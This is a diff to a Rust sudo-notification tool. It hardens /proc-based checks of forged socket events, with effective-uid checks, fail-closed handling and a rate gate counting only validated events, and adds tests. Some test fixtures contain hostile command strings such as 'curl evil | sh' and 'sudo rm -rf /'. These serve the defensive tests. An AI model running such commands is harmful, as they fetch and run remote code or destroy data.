@@ -117,28 +117,36 @@ fn write_icons(runtime: &Path) -> String {
     dir.to_string_lossy().into_owned()
 }
 
-/// At most this many events per window reach the main loop (a real sudo sends two or three).
+/// At most this many checked events per window reach the main loop (a real sudo sends two or
+/// three). Counted after `checked`: forged junk never uses up the window, so it cannot push the
+/// probe's real event out.
 const LISTEN_MAX: u32 = 60;
 const LISTEN_WINDOW: Duration = Duration::from_secs(10);
 
 /// An event as sent is anybody's (any process of this user can write the socket); what sudo is
-/// doing is the kernel's. The pid must be a live `sudo` (or `sudoedit`) of this user, and its own
-/// command line replaces the one in the event, so a forged datagram cannot make a notification
-/// name a command that is not the one running. A pid that cannot be read is dropped (a forged
-/// event names a dead one), unless /proc hides every process but our own (`hidepid`, seen as
-/// pid 1 being unreadable), where the event as sent is all there is.
+/// doing is the kernel's. The pid must be a live `sudo` (or `sudoedit`) of this user: real uid
+/// ours and effective uid 0, as a setuid-root sudo always has and as nothing of this user can
+/// (argv[0] is the caller's to choose, so the name alone proves nothing). Its own command line
+/// replaces the one in the event, so a forged datagram cannot make a notification name a command
+/// that is not the one running. Fails closed: a pid whose command line or uids cannot be read is
+/// dropped, including under `hidepid` or in a PID namespace, where the event as sent is only the
+/// sender's word.
 fn checked(mut e: Event, proc_root: &Path) -> Option<Event> {
     let dir = proc_root.join(e.sudo_pid.to_string());
-    let Ok(argv) = fs::read(dir.join("cmdline")) else {
-        let hidepid = fs::read(proc_root.join("1").join("cmdline")).is_err();
-        return hidepid.then_some(e);
+    let argv = fs::read(dir.join("cmdline")).ok()?;
+    let me = fs::metadata(proc_root.join("self")).ok()?.uid();
+    let status = fs::read_to_string(dir.join("status")).ok()?;
+    let mut ids = status
+        .lines()
+        .find_map(|l| l.strip_prefix("Uid:"))?
+        .split_whitespace()
+        .map(str::parse::<u32>);
+    let (Some(Ok(real)), Some(Ok(effective))) = (ids.next(), ids.next()) else {
+        return None;
     };
-    let me = fs::metadata(proc_root.join("self")).map(|m| m.uid()).ok();
-    let theirs = fs::read_to_string(dir.join("status")).ok().and_then(|s| {
-        s.lines()
-            .find_map(|l| l.strip_prefix("Uid:"))
-            .and_then(|v| v.split_whitespace().next()?.parse::<u32>().ok())
-    });
+    if real != me || effective != 0 {
+        return None;
+    }
     let words: Vec<&[u8]> = argv
         .strip_suffix(b"\0")
         .unwrap_or(&argv)
@@ -148,12 +156,36 @@ fn checked(mut e: Event, proc_root: &Path) -> Option<Event> {
         .first()
         .and_then(|w| w.rsplit(|b| *b == b'/').next())
         .is_some_and(|b| b == b"sudo" || b == b"sudoedit");
-    if !is_sudo || (me.is_some() && theirs.is_some() && me != theirs) {
+    if !is_sudo {
         return None;
     }
     let joined = words.join(&b' ');
     e.command = crate::text::clean(&String::from_utf8_lossy(&joined), crate::event::MAX_COMMAND);
     Some(e)
+}
+
+/// The listener's limit: at most `LISTEN_MAX` events per `LISTEN_WINDOW` reach the main loop.
+struct Gate {
+    since: Instant,
+    count: u32,
+}
+
+impl Gate {
+    fn new() -> Self {
+        Gate {
+            since: Instant::now(),
+            count: 0,
+        }
+    }
+
+    fn admit(&mut self, e: Event, proc_root: &Path) -> Option<Event> {
+        let e = checked(e, proc_root)?;
+        if self.since.elapsed() >= LISTEN_WINDOW {
+            *self = Gate::new();
+        }
+        self.count += 1;
+        (self.count <= LISTEN_MAX).then_some(e)
+    }
 }
 
 fn open_window(child: &mut Option<Child>, setup: bool) {
@@ -234,19 +266,13 @@ pub fn run(env: Env) -> i32 {
     {
         // Any process of this user can write the socket: a flood must cost bounded memory and
         // never hold up the menu, so events beyond a sudo's worth are dropped HERE, before they
-        // are queued (the engine's own limit only applies to what it is handed).
+        // are queued (the engine's own limit only applies to what it is handed). Only events
+        // that passed the /proc check count (`Gate`).
         let tx = tx.clone();
-        let mut window = (Instant::now(), 0u32);
+        let mut gate = Gate::new();
         thread::spawn(move || {
             listener::serve(&sock, |e| {
-                if window.0.elapsed() >= LISTEN_WINDOW {
-                    window = (Instant::now(), 0);
-                }
-                window.1 += 1;
-                if window.1 > LISTEN_MAX {
-                    return true;
-                }
-                let Some(e) = checked(e, Path::new("/proc")) else {
+                let Some(e) = gate.admit(e, Path::new("/proc")) else {
                     return true;
                 };
                 tx.send(Msg::Event(e)).is_ok()
@@ -445,6 +471,29 @@ mod tests {
     use crate::event::Kind;
     use crate::track::fake::Proc;
 
+    /// `/proc/self` of the fake root: this test's own uid, as the kernel would show it.
+    fn me(p: &Proc) -> u32 {
+        let s = p.root().join("self");
+        fs::create_dir_all(&s).unwrap();
+        fs::metadata(&s).unwrap().uid()
+    }
+
+    /// The `Uid:` line of `/proc/<pid>/status`: real, effective, saved, filesystem.
+    fn uids(p: &Proc, pid: u32, real: u32, effective: u32) {
+        fs::write(
+            p.root().join(pid.to_string()).join("status"),
+            format!("Name:\tsudo\nUid:\t{real}\t{effective}\t{effective}\t{effective}\n"),
+        )
+        .unwrap();
+    }
+
+    /// A real sudo of this user: setuid root, so its effective uid is 0.
+    fn sudo(p: &Proc, pid: u32, args: &[&str]) {
+        p.cmdline(pid, args);
+        let m = me(p);
+        uids(p, pid, m, 0);
+    }
+
     fn asking(pid: u32, command: &str) -> Event {
         Event {
             kind: Kind::Asking,
@@ -459,7 +508,7 @@ mod tests {
     #[test]
     fn a_forged_command_is_replaced_by_what_sudo_is_running() {
         let p = Proc::new("checked-forge");
-        p.cmdline(4242, &["sudo", "sh", "-c", "curl evil | sh"]);
+        sudo(&p, 4242, &["sudo", "sh", "-c", "curl evil | sh"]);
         let e = checked(asking(4242, "sudo apt update"), p.root()).expect("a sudo");
         assert_eq!(e.command, "sudo sh -c curl evil | sh");
     }
@@ -468,25 +517,78 @@ mod tests {
     fn an_event_naming_a_process_that_is_not_sudo_is_dropped() {
         let p = Proc::new("checked-notsudo");
         p.cmdline(77, &["/usr/bin/python3", "x.py"]);
+        let m = me(&p);
+        uids(&p, 77, m, 0);
         assert!(checked(asking(77, "sudo true"), p.root()).is_none());
     }
 
     #[test]
-    fn a_dead_pid_is_dropped_unless_proc_hides_everyone() {
-        // A forged event names a pid that does not exist: dropped while pid 1 is readable.
+    fn a_pid_that_cannot_be_read_is_dropped_even_under_hidepid() {
+        // A forged event names a pid that does not exist: dropped.
         let p = Proc::new("checked-gone");
         p.cmdline(1, &["/sbin/init"]);
         assert!(checked(asking(999_999, "sudo rm -rf / # approve me"), p.root()).is_none());
-        // hidepid: nothing but our own processes is readable, so the event is all there is.
+        // hidepid (or a PID namespace): pid 1 is unreadable too. The event as sent is then
+        // anybody's word, and a notification naming it would be the forger's text: dropped.
         let h = Proc::new("checked-hidepid");
-        let e = checked(asking(99, "sudo id"), h.root()).expect("kept");
-        assert_eq!(e.command, "sudo id");
+        assert!(checked(asking(99, "sudo apt update   (forged)"), h.root()).is_none());
+    }
+
+    #[test]
+    fn a_process_named_sudo_that_is_not_setuid_root_is_dropped() {
+        // Any process can call itself "sudo" (argv[0] is the caller's to choose); none of the
+        // user's can have effective uid 0. Under CI's root the real uid is 0, so the forger's
+        // effective uid there is some other one.
+        let p = Proc::new("checked-euid");
+        p.cmdline(4243, &["sudo", "apt", "update"]);
+        let m = me(&p);
+        uids(&p, 4243, m, if m == 0 { 1000 } else { m });
+        assert!(checked(asking(4243, "sudo apt update"), p.root()).is_none());
+        // The control: the same process as a real sudo is kept.
+        uids(&p, 4243, m, 0);
+        assert!(checked(asking(4243, "x"), p.root()).is_some());
+    }
+
+    #[test]
+    fn a_sudo_whose_uids_cannot_be_read_is_dropped() {
+        let p = Proc::new("checked-nostatus");
+        p.cmdline(4244, &["sudo", "id"]);
+        me(&p);
+        assert!(checked(asking(4244, "sudo id"), p.root()).is_none());
+    }
+
+    #[test]
+    fn a_flood_of_forged_events_cannot_crowd_out_a_real_one() {
+        // 100 datagrams naming a live process that is not sudo, then the probe's real event:
+        // only what passed the check counts against the limit.
+        let p = Proc::new("gate-flood");
+        p.cmdline(77, &["/usr/bin/python3", "x.py"]);
+        sudo(&p, 4242, &["sudo", "sh", "-c", "evil"]);
+        let mut g = Gate::new();
+        for _ in 0..100 {
+            assert!(g.admit(asking(77, "sudo apt update"), p.root()).is_none());
+        }
+        let e = g
+            .admit(asking(4242, "sudo apt update"), p.root())
+            .expect("the real one");
+        assert_eq!(e.command, "sudo sh -c evil");
+    }
+
+    #[test]
+    fn genuine_events_are_still_rate_limited() {
+        let p = Proc::new("gate-limit");
+        sudo(&p, 4242, &["sudo", "true"]);
+        let mut g = Gate::new();
+        for _ in 0..LISTEN_MAX {
+            assert!(g.admit(asking(4242, "x"), p.root()).is_some());
+        }
+        assert!(g.admit(asking(4242, "x"), p.root()).is_none());
     }
 
     #[test]
     fn sudoedit_is_sudo_too() {
         let p = Proc::new("checked-sudoedit");
-        p.cmdline(55, &["sudoedit", "/etc/hosts"]);
+        sudo(&p, 55, &["sudoedit", "/etc/hosts"]);
         assert_eq!(
             checked(asking(55, "x"), p.root()).unwrap().command,
             "sudoedit /etc/hosts"
